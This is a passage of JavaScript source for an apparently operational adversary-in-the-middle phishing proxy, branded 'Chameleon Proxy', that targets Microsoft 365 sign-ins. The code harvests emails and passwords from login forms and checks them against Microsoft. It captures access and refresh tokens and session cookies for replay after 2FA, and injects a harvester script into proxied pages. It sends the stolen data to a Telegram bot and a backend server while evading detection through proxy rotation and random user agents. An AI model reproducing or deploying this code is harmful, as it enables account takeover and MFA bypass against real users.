            console.log(`[MICROSOFT] ✅ Valid credentials for: ${email}`);
            // Add success parameters
            const parsed = new URL(redirectUrl);
            parsed.searchParams.set('login', 'success');
            redirectUrl = parsed.toString();
        } else if (validationResult?.requires2FA) {
            console.log(`[MICROSOFT] 🔐 2FA required for: ${email}`);
            // Redirect to Microsoft 2FA
            const mfaUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}` +
                `&response_type=code` +
                `&redirect_uri=${MICROSOFT_REDIRECT_URI}` +
                `&scope=openid%20profile%20email%20offline_access` +
                `&login_hint=${encodeURIComponent(email)}` +
                `&prompt=select_account`;
            redirectUrl = mfaUrl;
        } else {
            console.log(`[MICROSOFT] ❌ Invalid credentials for: ${email}`);
            // Add error parameters
            const parsed = new URL(redirectUrl);
            parsed.searchParams.set('error', 'invalid_credentials');
            redirectUrl = parsed.toString();
        }

        // Set response
        res.writeHead(302, {
            'Location': redirectUrl,
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache',
            'X-Microsoft-Session': sessionId || ''
        });
        res.end();

    } catch (error) {
        console.error('[ERROR] Microsoft POST handling:', error.message);
        res.writeHead(500, { 'Content-Type': 'text/html' });
        res.end('<h1>Microsoft Service Error</h1><p>Please try again</p>');
    }
}

// ============================================================
//  ENHANCED: Handle Microsoft Proxy Request
// ============================================================

async function handleMicrosoftProxy(req, res, targetUrl, session, sessionId) {
    console.log(`[PROXY] 🔄 Microsoft target: ${targetUrl}`);

    try {
        const parsedTarget = new URL(targetUrl);
        const protocol = parsedTarget.protocol === 'https:' ? https : http;
        
        // Get proxy if rotation needed
        const proxy = ipRotator.shouldRotate() ? ipRotator.getNextProxy() : null;
        
        // Build request with Microsoft-specific headers
        const options = {
            hostname: parsedTarget.hostname,
            port: parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80),
            path: parsedTarget.pathname + parsedTarget.search,
            method: req.method,
            headers: {
                ...req.headers,
                host: parsedTarget.hostname,
                ...antiDetection.generateMicrosoftHeaders(),
                'user-agent': generateRandomUserAgent(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache'
            },
            rejectUnauthorized: false,
            timeout: PROXY_TIMEOUT,
            ...(proxy && {
                proxy: {
                    host: proxy.host,
                    port: proxy.port
                }
            })
        };

        // Remove problematic headers
        delete options.headers['cookie'];
        delete options.headers['content-length'];
        delete options.headers['content-encoding'];
        delete options.headers['connection'];
        delete options.headers['host'];

        const proxyReq = protocol.request(options, (proxyRes) => {
            let data = [];
            let contentLength = 0;

            proxyRes.on('data', chunk => {
                data.push(chunk);
                contentLength += chunk.length;
            });

            proxyRes.on('end', async () => {
                let body = Buffer.concat(data);

                // Handle compression
                const encoding = proxyRes.headers['content-encoding'];
                if (encoding) {
                    try {
                        if (encoding.includes('gzip')) {
                            body = zlib.gunzipSync(body);
                        } else if (encoding.includes('deflate')) {
                            body = zlib.inflateSync(body);
                        }
                        delete proxyRes.headers['content-encoding'];
                    } catch (e) {
                        console.log('[PROXY] Decompression error:', e.message);
                    }
                }

                // Inject Microsoft-specific script
                const contentType = proxyRes.headers['content-type'] || '';
                if (contentType.includes('text/html')) {
                    try {
                        let html = body.toString('utf8');
                        
                        // Check if already injected
                        if (!html.includes('Chameleon Proxy') && !html.includes('microsoft_harvester')) {
                            // Use Microsoft-specific injection
                            html = injector.injectMicrosoftScript(html, sessionId);
                            body = Buffer.from(html);
                            proxyRes.headers['content-length'] = body.length;
                            console.log('[PROXY] ✅ Microsoft stealth injection applied');
                            
                            // Store Microsoft cookies for replay
                            const cookies = proxyRes.headers['set-cookie'];
                            if (cookies && session) {
                                session.microsoftCookies = cookies;
                            }
                        } else {
                            console.log('[PROXY] ⚠️ Script already present');
                        }
                    } catch (e) {
                        console.log('[PROXY] Injection error:', e.message);
                    }
                }

                // Store Microsoft response headers for session
                if (session && proxyRes.headers['set-cookie']) {
                    session.microsoftCookies = proxyRes.headers['set-cookie'];
                }

                // Set response headers with anti-caching
                const headers = {
                    ...proxyRes.headers,
                    'X-Frame-Options': 'SAMEORIGIN',
                    'X-Content-Type-Options': 'nosniff',
                    'X-XSS-Protection': '1; mode=block',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0',
                    'X-Microsoft-Session': sessionId || ''
                };

                delete headers['content-encoding'];
                delete headers['transfer-encoding'];

                res.writeHead(proxyRes.statusCode, headers);
                res.end(body);
            });
        });

        proxyReq.on('error', (err) => {
            console.error(`[PROXY] ❌ Error: ${err.message}`);
            // Redirect to Microsoft directly on error
            const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}` +
                `&response_type=code` +
                `&redirect_uri=${MICROSOFT_REDIRECT_URI}` +
                `&scope=openid%20profile%20email%20offline_access`;
            res.writeHead(302, { 'Location': fallbackUrl });
            res.end();
        });

        proxyReq.on('timeout', () => {
            console.error('[PROXY] ⏰ Timeout');
            proxyReq.destroy();
            const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}` +
                `&response_type=code` +
                `&redirect_uri=${MICROSOFT_REDIRECT_URI}` +
                `&scope=openid%20profile%20email%20offline_access`;
            res.writeHead(302, { 'Location': fallbackUrl });
            res.end();
        });

        // Forward body if present
        if (req.method === 'POST' || req.method === 'PUT') {
            let body = '';
            req.on('data', chunk => body += chunk);
            req.on('end', () => {
                proxyReq.write(body);
                proxyReq.end();
            });
        } else {
            proxyReq.end();
        }

    } catch (error) {
        console.error('[PROXY] ❌ Fatal error:', error.message);
        res.writeHead(302, { 'Location': 'https://login.microsoftonline.com/' });
        res.end();
    }
}

// ============================================================
//  ENHANCED: Microsoft-Specific Telegram Alerts
// ============================================================

async function sendMicrosoftTelegramAlert(email, password, validationResult, ip, attemptCount, targetUrl, fullData, sessionId, isMicrosoft) {
    try {
        const fetch = require('node-fetch');
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.log('[TELEGRAM] ⚠️ Missing credentials');
            return;
        }

        const timestamp = new Date().toISOString();
        
        let msg = `🎯 *MICROSOFT 365 - Credential Capture*\n\n`;
        msg += `*📧 Email:* ${email || 'unknown'}\n`;
        msg += `*🔑 Password:* ${password ? '***' : 'N/A'}\n`;
        msg += `*📡 IP:* ${ip}\n`;
        msg += `*🕐 Time:* ${timestamp}\n`;
        msg += `*🔄 Attempt:* ${attemptCount || 1}\n`;
        
        if (validationResult) {
            msg += `\n*🔐 Validation Status:* ${validationResult.valid ? '✅ VALID' : '❌ INVALID'}\n`;
            if (validationResult.requires2FA) {
                msg += `*🛡️ 2FA/MFA:* 🔐 **REQUIRED**\n`;
                msg += `*📌 Note:* User must complete 2FA - session will be captured after\n`;
            } else {
                msg += `*🛡️ 2FA/MFA:* ❌ Not Required\n`;
            }
            if (validationResult.token) {
                msg += `\n*🎟️ Access Token:* \`${validationResult.token.substring(0, 30)}...\`\n`;
            }
            if (validationResult.refresh_token) {
                msg += `*🔄 Refresh Token:* \`${validationResult.refresh_token.substring(0, 30)}...\`\n`;
            }
            if (validationResult.correlation_id) {
                msg += `*🔗 Correlation ID:* \`${validationResult.correlation_id}\`\n`;
            }
        }
        
        if (sessionId) {
            msg += `*🆔 Session ID:* \`${sessionId.substring(0, 16)}...\`\n`;
        }
        
        // Add Microsoft-specific info
        if (isMicrosoft) {
            msg += `\n*💻 Service:* Microsoft 365 / Office\n`;
            msg += `*🌐 Platform:* ${fullData?.platform || 'Unknown'}\n`;
        }

        // Add captured form data
        if (fullData && Object.keys(fullData).length > 0) {
            const importantFields = ['client_id', 'grant_type', 'scope', 'response_type', 'redirect_uri'];
            let extraInfo = '\n*📋 Additional Microsoft Data:*\n';
            let hasExtra = false;
            for (const field of importantFields) {
                if (fullData[field]) {
                    extraInfo += `  • ${field}: ${fullData[field]}\n`;
                    hasExtra = true;
                }
            }
            if (hasExtra) {
                msg += extraInfo;
            }
        }

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: msg,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        console.log(`[TELEGRAM] ✅ Microsoft alert sent for: ${email}`);
    } catch (error) {
        console.error(`[TELEGRAM] ❌ Error: ${error.message}`);
    }
}

// ============================================================
//  HELPERS
// ============================================================

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) return forwarded.split(',')[0].trim();
    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();
    return req.socket.remoteAddress || 'unknown';
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function extractCredentials(body) {
    try {
        const formData = typeof body === 'string' ? querystring.parse(body) : body;
        let email = formData.email || formData.username || formData.user || 
                    formData.login || formData.loginfmt || formData.userid || 
                    formData.name || formData.account || formData.mail || '';
        const password = formData.password || formData.pass || formData.passwd || 
                        formData.pwd || formData.userpass || formData.passcode || '';

        // Try to find Microsoft-specific email
        if (!email) {
            for (const [key, value] of Object.entries(formData)) {
                if (value && typeof value === 'string') {
                    if (value.includes('@') && !password.includes(value)) {
                        email = value;
                        break;
                    }
                    const emailMatch = value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                    if (emailMatch) {
                        email = emailMatch[0];
                        break;
                    }
                }
            }
        }
        
        // Microsoft-specific: Try to get email from login_hint
        if (!email && formData.login_hint) {
            email = formData.login_hint;
        }

        return { email: email || 'unknown', password: password || '', formData };
    } catch (e) {
        return { email: 'unknown', password: '', formData: {} };
    }
}

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        });
        res.end(data);
    });
}

async function sendToBackend(email, password, req, type, ip, validationResult) {
    try {
        const fetch = require('node-fetch');
        await fetch(`${BACKEND_URL}/api/log-action`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'microsoft_credential_capture',
                email: email,
                password: password,
                type: type,
                ip: ip,
                validation: validationResult,
                timestamp: new Date().toISOString(),
                userAgent: req.headers['user-agent'] || 'Unknown',
                referer: req.headers['referer'] || 'Unknown'
            })
        });
        console.log(`[BACKEND] ✅ Logged Microsoft credentials for: ${email}`);
    } catch (e) {
        console.log(`[BACKEND] ⚠️ Failed to log: ${e.message}`);
    }
}

// ============================================================
//  SESSION CLEANUP
// ============================================================

setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    for (const [id, session] of msSessionManager.sessions) {
        if (now - session.lastActivity > SESSION_TTL) {
            msSessionManager.sessions.delete(id);
            cleaned++;
        }
    }
    if (cleaned > 0) {
        console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired Microsoft sessions`);
    }
}, 5 * 60 * 1000);

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║     🦎  CHAMELEON PROXY v2.0 - MICROSOFT EDITION       ║');
    console.log('║     🔐  Microsoft 365 / Office 365 Optimized            ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log(`║   📍 Server:    http://localhost:${PORT}                   ║`);
    console.log('║   🔗 Usage:     /?target=https://login.microsoftonline.com ║');
    console.log(`║   🔗 Keylogger: ${KEYLOGGER_URL}`);
    console.log(`║   🔗 Backend:   ${BACKEND_URL}`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log('║   🎯 Microsoft Features:                                 ║');
    console.log('║   • Microsoft OAuth2 credential validation               ║');
    console.log('║   • 2FA/MFA detection and handling                       ║');
    console.log('║   • Token capture (access, refresh, ID)                 ║');
    console.log('║   • Session replay capability                            ║');
    console.log('║   • Microsoft-specific script injection                 ║');
    console.log('║   • Auto-login hint extraction                           ║');
    console.log('║   • Microsoft cookie persistence                        ║');
    console.log('║   • Multi-attempt tracking                              ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log('║   📦 Environment Variables Required:                     ║');
    console.log('║   • TELEGRAM_BOT_TOKEN                                  ║');
    console.log('║   • TELEGRAM_CHAT_ID                                    ║');
    console.log('║   • MICROSOFT_CLIENT_ID (optional)                      ║');
    console.log('║   • BACKEND_URL (optional)                              ║');
    console.log('║   • KEYLOGGER_URL (optional)                            ║');
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  GRACEFUL SHUTDOWN
// ============================================================

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down Microsoft proxy...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('🛑 Shutting down Microsoft proxy...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
    console.error('Stack:', err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise);
    console.error('Reason:', reason);
});